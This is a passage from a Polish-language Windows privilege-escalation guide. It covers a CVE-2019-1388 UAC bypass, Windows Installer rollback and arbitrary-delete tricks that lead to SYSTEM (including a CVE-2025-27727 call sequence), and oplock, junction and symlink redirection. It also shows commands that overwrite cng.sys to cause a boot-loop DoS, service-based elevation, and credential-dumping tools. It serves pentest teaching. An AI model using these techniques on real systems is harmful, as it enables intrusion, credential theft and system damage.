Po uzyskaniu powłoki jako użytkownik może się okazać, że uruchamiane są zaplanowane zadania lub inne procesy, które **przekazują dane uwierzytelniające w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika z niskimi uprawnieniami do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a UAC jest włączone, w niektórych wersjach systemu Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM” z poziomu nieuprzywilejowanego użytkownika.

Umożliwia to jednoczesne podniesienie uprawnień i obejście UAC dzięki tej samej luce. Nie trzeba też niczego instalować, a plik binarny używany w tym procesie jest podpisany i wydany przez Microsoft.

Do systemów, których dotyczy problem, należą między innymi:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administratora na średni do wysokiego poziomu integralności / obejście UAC

Przeczytaj to, aby **dowiedzieć się o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i metodach jego obejścia:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Przekierowanie junction katalogu uploadu do katalogu udostępnianego przez serwer

Aplikacja może tworzyć przewidywalny podkatalog uploadu, zapisywać w nim plik o nazwie podanej przez wywołującego, a następnie przetwarzać ten plik. Jeśli użytkownik z niskimi uprawnieniami może usunąć i zastąpić ten podkatalog junction NTFS przed zapisem po stronie serwera, zapis może zostać przekierowany przez junction do katalogu udostępnianego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z tożsamością usługi WWW, jeśli serwer wykonuje pliki tego typu. Jest to specyficzna dla aplikacji granica arbitrary-write; sam zapis do katalogu uploadu lub istniejący junction nie stanowią dowodu.

Sprawdź dokładną konstrukcję ścieżki i czas wykonania w obsłudze uploadu, efektywne uprawnienia użytkownika do usuwania/tworzenia podkatalogu, efektywne ACL miejsca docelowego, to, czy proces zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w miejscu docelowym. Osobno potwierdź tożsamości procesu zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać ACL katalogów i metadane punktów ponownej analizy, ale nie pozwala ustalić zachowania obsługi ani przyszłej podmiany junction. Jeśli wykonanie następuje w kontekście konta usługi, przed rozważeniem osobnej ścieżki wykorzystującej uprawnienia tokenu sprawdź **rzeczywisty token procesu**.

## Od możliwości usuwania/przenoszenia/zmiany nazwy dowolnego folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), a kod exploita jest [**dostępny tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na nadużyciu funkcji wycofywania zmian Windows Installer w celu zastąpienia legalnych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który zostanie użyty do przejęcia folderu `C:\Config.Msi`. Windows Installer wykorzysta go później do przechowywania plików wycofywania zmian podczas odinstalowywania innych pakietów MSI; pliki wycofywania zostaną wcześniej zmodyfikowane tak, aby zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia Windows Installer COM (CVE-2025-27727)

Klient z niskimi uprawnieniami może uzyskać dostęp do usługi SYSTEM `msiexec.exe` za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Inżynieria wsteczna pozwoliła zidentyfikować odpowiednie wywołania `IMsiServer`: `MsiBeginTransactionW` pod offsetem vtable `0xA0`, `SetEEUIDirectoryAndFilter` pod `0xC8` oraz `CleanupTempPackages` pod `0x50`. Te nazwy i offsety ustalono w drodze inżynierii wstecznej i mogą się różnić w zależności od kompilacji.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` wykonuje impersonację wywołującego tylko podczas otwierania podanej ścieżki z uprawnieniem `DELETE` oraz flagami `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Potwierdza to, że wywołujący może usunąć katalog, i zapobiega podążaniu za punktem ponownej analizy, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że utworzył go Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` `SetEEUIDirectoryAndFilter` planuje ścieżkę do usunięcia jako folder, niezależnie od argumentu filtra podanego przez wywołującego. Usługa zapisuje nazwaną wartość `REG_DWORD` w `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwa wartości to ścieżka kontrolowana przez wywołującego, a dane `0x00000002` oznaczają flagę folderu. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio uruchamia czyszczenie. Proces roboczy z podwyższonymi uprawnieniami wylicza wartości rejestru i przekazuje wpisy folderów do rekurencyjnego `FDeleteFolder`, nie sprawdzając pochodzenia ścieżek. Jeśli standardowe usuwanie się nie powiedzie, kod wywołuje także `LockdownPath`, czyści atrybuty pliku i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odtworzona z `msi.dll` to:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Przydatnym prymitywem jest ponowne użycie ścieżki, a nie przekierowanie za pomocą junction. Zarejestruj utworzony przez atakującego katalog `C:\Config.Msi`, usuń go i poczekaj, aż Windows Installer utworzy ponownie tę samą ścieżkę z chronionymi danymi rollback. Procedura czyszczenia ufa nieaktualnej nazwie `TempPackages` i usuwa nowy katalog jako SYSTEM. Pozwala to ominąć zamierzoną ochronę zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do opisanej poniżej sekwencji rollback: zachowaj osobny wpis `Installer\Folders`, usuń chroniony katalog `C:\Config.Msi`, utwórz go ponownie z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC`, uzyskanym przed zaostrzeniem DACL przez installer. Wstępnie otwarty uchwyt może przywrócić liberalny DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić przed wznowieniem rollback.<sup>[[41]](#references)</sup>

Microsoft naprawił tę ścieżkę, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa flaga funkcji. Wywołanie COM może nadal zwracać sukces, ale ścieżka kontrolowana przez atakującego nie jest już dodawana do `TempPackages`. Zainstaluj aktualizacje zabezpieczeń Windows z kwietnia 2025 r. zamiast uznawać pomyślny zwrot metody za test poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowana technika wygląda następująco:

1. **Etap 1 – Przygotowanie do przejęcia (pozostaw `C:\Config.Msi` pusty)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz installer jako **"UAC Compliant"**, aby **użytkownik niebędący administratorem** mógł go uruchomić.
    - Po instalacji pozostaw otwarty **uchwyt** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
    - **Odpytuj otwarty uchwyt pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć, kiedy plik znajdzie się w `C:\Config.Msi\<random>.rbf`.

- Krok 3: Synchronizacja niestandardowa
    - Plik `.msi` zawiera **niestandardową akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — **uniemożliwia to jego usunięcie**.
    - Następnie **wyślij sygnał zwrotny**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **katalog `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Usuń ręcznie plik `.rbf`.
    - Teraz **katalog `C:\Config.Msi` jest pusty** i można go przejąć.

> W tym momencie **uruchom podatność pozwalającą na usunięcie dowolnego folderu z uprawnieniami SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Podmiana skryptów rollback na złośliwe**

- Krok 6: Utwórz ponownie `C:\Config.Msi` ze słabymi ACL
    - Samodzielnie utwórz ponownie folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, podając:
        - `TARGETDIR`: zapisywalną lokalizację.
        - `ERROROUT`: zmienną, która wywołuje wymuszone niepowodzenie.
    - Ta instalacja posłuży do ponownego uruchomienia **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pliki `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` i wykryć pojawienie się nowego pliku `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed rollback
    - Plik `.msi` zawiera **niestandardową akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie ustaw słabe ACL
    - Po otrzymaniu zdarzenia `".rbs created"`:
        - Windows Installer **ponownie ustawia silne ACL** dla `C:\Config.Msi`.
        - Ponieważ nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie ustawić słabe ACL**.

> ACL są **weryfikowane tylko podczas otwierania uchwytu**, więc nadal możesz zapisywać w folderze.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Zastąp plik `.rbs` **fałszywym skryptem rollback**, który instruuje Windows, aby:
        - Przywrócił plik `.rbf` (złośliwą bibliotekę DLL) w **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwy payload DLL działający na poziomie SYSTEM**.

- Krok 12: Uruchom rollback
    - Wyślij sygnał synchronizacji, aby installer wznowił działanie.
    - Skonfigurowano **niestandardową akcję typu 19 (`ErrorOut`)**, która **celowo powoduje niepowodzenie instalacji** w określonym momencie.
    - Powoduje to rozpoczęcie **rollback**.

- Krok 13: SYSTEM instaluje Twoją bibliotekę DLL
    - Windows Installer:
        - Odczytuje złośliwy plik `.rbs`.
        - Kopiuje bibliotekę DLL z pliku `.rbf` do lokalizacji docelowej.
    - Złośliwa biblioteka DLL znajduje się teraz w **ścieżce, z której ładuje ją SYSTEM**.

- Ostatni krok: Uruchom kod z uprawnieniami SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejętą bibliotekę DLL.
    - **Gotowe**: Twój kod wykonuje się **jako SYSTEM**.


### Od dowolnego usuwania/przenoszenia/zmiany nazwy plików do SYSTEM EoP

Główna technika MSI rollback (opisana powyżej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala tylko na **usuwanie dowolnych plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Jeśli więc **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usuwa cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co jeśli Twój prymityw nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- Wewnątrz utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Załóż **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Wyzwól proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplocka — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Dzięki temu `folder1` zostanie opróżniony bez przerwania oplocka.
    - Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplocka.

- Opcja B: Zmień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> To celuje w wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM kontynuuje działanie i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, tak naprawdę usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od utworzenia folderu w dowolnym miejscu do trwałego DoS

Wykorzystaj prymityw pozwalający **utworzyć dowolny folder jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz wcześniej w tym miejscu folder**, system Windows nie załaduje właściwego sterownika podczas uruchamiania.
- Następnie system Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Widzi folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje rozruch**.
- **Nie ma mechanizmu awaryjnego ani odzyskiwania** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych i dowiązań symbolicznych OM do nadpisania dowolnego pliku / DoS podczas rozruchu

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **konfiguracji, którą można zapisywać**, przekieruj tę ścieżkę za pomocą **dowiązań symbolicznych Object Manager + punktów montowania NTFS**, aby zamienić uprzywilejowany zapis w nadpisanie dowolnego pliku (nawet **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Wymagania**
- Konfiguracja przechowująca ścieżkę docelową jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i dowiązania symbolicznego pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić lokalizację uprzywilejowanego logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wybierze „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parser hex/PE), aby potwierdzić uszkodzenie; ponowne uruchomienie wymusza załadowanie przez Windows zmodyfikowanego sterownika → **DoS w postaci pętli rozruchowej**. Ta metoda ma też zastosowanie do każdego chronionego pliku, który usługa z podwyższonymi uprawnieniami otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli jego kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać podjęta próba załadowania jej w pierwszej kolejności, co czyni ten plik niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do System**

### **Nowa usługa**

Jeśli już działasz w procesie High Integrity, **droga do SYSTEM** może być łatwa — wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest to prawidłowa usługa albo że plik binarny szybko wykonuje niezbędne działania, ponieważ po 20 s zostanie zakończony, jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

Z procesu o High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell przy użyciu opakowania _**.msi**_.\
[Więcej informacji o kluczach rejestru, których to dotyczy, oraz o instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### High + uprawnienie SeImpersonate do System

**Kod znajdziesz** [**tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do uprawnień Full Token

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w procesie o High Integrity), będziesz móc **otworzyć prawie każdy proces** (z wyjątkiem procesów chronionych) z uprawnieniem SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika zazwyczaj polega na **wybraniu dowolnego procesu działającego jako SYSTEM ze wszystkimi uprawnieniami tokenu** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokenu_).\
**Przykład kodu wykonującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technika ta jest wykorzystywana przez meterpreter do eskalacji uprawnień w `getsystem`. Polega na **utworzeniu pipe, a następnie utworzeniu lub wykorzystaniu usługi do zapisu do tego pipe**. Następnie **serwer**, który utworzył pipe, używając uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o named pipes, przeczytaj to**](#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**przejścia z High Integrity do System przy użyciu named pipes, przeczytaj to**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć dll**, która jest **ładowana** przez **proces** działający jako **SYSTEM**, będziesz móc wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest również przydatny do tego rodzaju eskalacji uprawnień; ponadto jest **znacznie łatwiejszy do przeprowadzenia z procesu o High Integrity**, ponieważ taki proces będzie mieć **uprawnienia zapisu** do folderów używanych do ładowania dll.\
**Więcej o Dll hijacking możesz** [**dowiedzieć się tutaj**](dll-hijacking/index.html)**.**

### **Od Administrator lub Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE lub NETWORK SERVICE do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i poufne pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykrywane.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj opcji -Thorough w środowisku lokalnym.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia poświadczenia z Credential Manager. Wykrywane.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza password spray z zebranymi hasłami w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (należy skompilować przy użyciu VisualStudio) ([**wstępnie skompilowany**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**wstępnie skompilowany**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia poświadczenia z wielu programów (wstępnie skompilowany plik exe w github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (wstępnie skompilowany plik wykonywalny w github). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje możliwe błędne konfiguracje (exe z pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego wpisu (do poprawnego działania nie wymaga accesschk, ale może go użyć).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekt należy skompilować przy użyciu odpowiedniej wersji .NET ([zobacz to](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić zainstalowaną wersję .NET na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Podnoszenie uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsztaty lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień - Windows - Kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacja uprawnień - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → odszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokenu jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – W pogoni za Silver Fox: kot i mysz w cieniu jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Luka w systemie plików umożliwiająca uzyskanie uprzywilejowanego dostępu w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania łączy symbolicznych – użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Nadużywanie łączy symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port BOF dla Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
